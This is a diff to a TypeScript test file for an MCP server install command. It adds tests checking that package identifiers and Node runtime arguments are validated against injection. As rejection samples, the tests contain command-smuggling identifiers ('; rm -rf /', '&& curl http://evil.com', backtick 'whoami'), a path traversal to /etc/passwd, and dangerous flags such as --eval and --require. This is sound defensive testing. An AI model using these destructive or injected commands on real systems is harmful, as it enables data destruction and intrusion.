@@ -23,6 +23,8 @@ import {
   handleInstall,
   resolveInstallEntry,
   formatTrustScore,
+  validateIdentifier,
+  validateRuntimeArgs,
   type InstallDeps,
   type InstallOptions,
 } from "../../commands/install.js";
@@ -1054,6 +1056,166 @@ describe("resolveInstallEntry — HTTP remote with headers", () => {
     });
     const entry = resolveInstallEntry(server, "cursor");
     expect(entry.url).toBe("https://api.example.com/sse");
+  });
+});
+
+// ---------------------------------------------------------------------------
+// validateIdentifier — security: reject malicious package identifiers
+// ---------------------------------------------------------------------------
+
+describe("validateIdentifier — npm", () => {
+  it("accepts valid scoped npm packages", () => {
+    expect(() => validateIdentifier("@modelcontextprotocol/server-filesystem", "npm")).not.toThrow();
+  });
+
+  it("accepts valid unscoped npm packages", () => {
+    expect(() => validateIdentifier("my-server", "npm")).not.toThrow();
+  });
+
+  it("rejects npm identifiers with shell metacharacters", () => {
+    expect(() => validateIdentifier("my-server; rm -rf /", "npm")).toThrow(/malicious/i);
+  });
+
+  it("rejects npm identifiers with backticks", () => {
+    expect(() => validateIdentifier("`whoami`", "npm")).toThrow(/malicious/i);
+  });
+
+  it("rejects npm identifiers with path traversal", () => {
+    expect(() => validateIdentifier("../../etc/passwd", "npm")).toThrow(/malicious/i);
+  });
+});
+
+describe("validateIdentifier — pypi", () => {
+  it("accepts valid pypi package names", () => {
+    expect(() => validateIdentifier("mcp-server-filesystem", "pypi")).not.toThrow();
+  });
+
+  it("accepts mixed-case pypi package names", () => {
+    expect(() => validateIdentifier("MyServer", "pypi")).not.toThrow();
+  });
+
+  it("rejects pypi identifiers with shell metacharacters", () => {
+    expect(() => validateIdentifier("server && curl http://evil.com", "pypi")).toThrow(/malicious/i);
+  });
+});
+
+describe("validateIdentifier — oci", () => {
+  it("accepts valid OCI image references with tag", () => {
+    expect(() => validateIdentifier("my-org/my-server:latest", "oci")).not.toThrow();
+  });
+
+  it("rejects OCI identifiers with shell metacharacters", () => {
+    expect(() => validateIdentifier("myimage:latest; id", "oci")).toThrow(/malicious/i);
+  });
+
+  it("rejects OCI identifiers without a tag", () => {
+    expect(() => validateIdentifier("my-org/my-server", "oci")).toThrow(/malicious/i);
+  });
+});
+
+describe("validateIdentifier — unknown registry type", () => {
+  it("does not throw for unknown registry types (no pattern to match)", () => {
+    expect(() => validateIdentifier("anything goes", "custom")).not.toThrow();
+  });
+});
+
+// ---------------------------------------------------------------------------
+// validateRuntimeArgs — security: reject dangerous flags
+// ---------------------------------------------------------------------------
+
+describe("validateRuntimeArgs", () => {
+  it("accepts normal runtime arguments", () => {
+    expect(() => validateRuntimeArgs(["--port=3000", "--verbose"])).not.toThrow();
+  });
+
+  it("rejects --eval flag", () => {
+    expect(() => validateRuntimeArgs(["--eval=process.exit()"])).toThrow(/dangerous/i);
+  });
+
+  it("rejects --require flag", () => {
+    expect(() => validateRuntimeArgs(["--require", "/tmp/malicious.js"])).toThrow(/dangerous/i);
+  });
+
+  it("rejects --inspect flag", () => {
+    expect(() => validateRuntimeArgs(["--inspect=0.0.0.0:9229"])).toThrow(/dangerous/i);
+  });
+
+  it("rejects -e flag (shorthand for --eval)", () => {
+    expect(() => validateRuntimeArgs(["-e", "require('child_process').exec('id')"])).toThrow(/dangerous/i);
+  });
+
+  it("rejects --import flag", () => {
+    expect(() => validateRuntimeArgs(["--import=/tmp/malicious.mjs"])).toThrow(/dangerous/i);
+  });
+
+  it("rejects arguments containing path traversal (..)", () => {
+    expect(() => validateRuntimeArgs(["../../etc/passwd"])).toThrow(/dangerous/i);
+  });
+
+  it("accepts empty array", () => {
+    expect(() => validateRuntimeArgs([])).not.toThrow();
+  });
+});
+
+// ---------------------------------------------------------------------------
+// resolveInstallEntry — injection validation is called
+// ---------------------------------------------------------------------------
+
+describe("resolveInstallEntry — identifier validation", () => {
+  it("throws for a malicious npm identifier", () => {
+    const server = makeServerEntry({
+      packages: [
+        {
+          registryType: "npm",
+          identifier: "@test/server; rm -rf /",
+          environmentVariables: [],
+          runtimeArguments: [],
+        },
+      ],
+    });
+    expect(() => resolveInstallEntry(server, "claude-desktop")).toThrow(/malicious/i);
+  });
+
+  it("throws for a dangerous runtime arg in npm package", () => {
+    const server = makeServerEntry({
+      packages: [
+        {
+          registryType: "npm",
+          identifier: "@test/my-server",
+          environmentVariables: [],
+          runtimeArguments: ["--eval=evil()"],
+        },
+      ],
+    });
+    expect(() => resolveInstallEntry(server, "claude-desktop")).toThrow(/dangerous/i);
+  });
+
+  it("throws for a malicious pypi identifier", () => {
+    const server = makeServerEntry({
+      packages: [
+        {
+          registryType: "pypi",
+          identifier: "server && curl http://evil.com",
+          environmentVariables: [],
+          runtimeArguments: [],
+        },
+      ],
+    });
+    expect(() => resolveInstallEntry(server, "claude-desktop")).toThrow(/malicious/i);
+  });
+
+  it("throws for a malicious oci identifier", () => {
+    const server = makeServerEntry({
+      packages: [
+        {
+          registryType: "oci",
+          identifier: "myimage:latest; id",
+          environmentVariables: [],
+          runtimeArguments: [],
+        },
+      ],
+    });
+    expect(() => resolveInstallEntry(server, "claude-desktop")).toThrow(/malicious/i);
   });
 });
 
